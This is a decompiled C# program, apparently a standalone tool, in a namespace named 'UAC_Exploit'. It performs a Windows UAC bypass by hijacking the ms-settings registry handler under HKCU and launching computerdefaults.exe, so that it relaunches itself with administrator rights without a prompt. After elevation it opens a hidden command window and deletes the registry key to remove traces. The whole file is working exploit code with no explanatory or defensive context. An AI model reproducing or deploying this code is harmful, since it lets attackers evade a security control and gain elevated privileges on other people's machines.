using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace UAC_Exploit
{
	// Token: 0x02000008 RID: 8
	[StandardModule]
	internal sealed class Execution
	{
		// Token: 0x06000010 RID: 16 RVA: 0x00002140 File Offset: 0x00000340
		[STAThread]
		public static void Main()
		{
			try
			{
				if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					Execution.GetUAC();
				}
				else
				{
					Interaction.Shell("cmd.exe /c start \"UAC-Exploit\" \"cmd.exe\" \"/k @echo     ^^ ^^ ^^ ^^ ^^ ^^  :o 9h4wk", AppWinStyle.Hide, true, -1);
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
					registryKey.DeleteSubKeyTree("shell");
					registryKey.Close();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000021B8 File Offset: 0x000003B8
		public static RegistryKey OpenRegSubKey(string RegPath)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string.Format("Software\\{0}", RegPath), true);
			if (registryKey != null)
			{
				return registryKey;
			}
			return Registry.CurrentUser.CreateSubKey(string.Format("Software\\{0}", RegPath), true);
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000021F8 File Offset: 0x000003F8
		public static void GetUAC()
		{
			checked
			{
				if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					string[] array = new string[]
					{
						"Classes",
						"Classes\\ms-settings",
						"Classes\\ms-settings\\shell",
						"Classes\\ms-settings\\shell\\open"
					};
					for (int i = 0; i < array.Length; i++)
					{
						Execution.OpenRegSubKey(array[i]);
					}
					try
					{
						RegistryKey registryKey = Execution.OpenRegSubKey("Classes\\ms-settings\\shell\\open\\command");
						registryKey.SetValue("", Process.GetCurrentProcess().MainModule.FileName, RegistryValueKind.String);
						registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
						registryKey.Close();
						Process.Start(new ProcessStartInfo
						{
							CreateNoWindow = true,
							UseShellExecute = false,
							RedirectStandardError = true,
							RedirectStandardOutput = true,
							FileName = "cmd.exe",
							Arguments = "/c @start computerdefaults.exe"
						});
						return;
					}
					catch (Exception ex)
					{
						return;
					}
				}
				Execution.OpenRegSubKey("Classes\\ms-settings\\shell\\open\\command").SetValue(null, null, RegistryValueKind.String);
			}
		}
	}
}
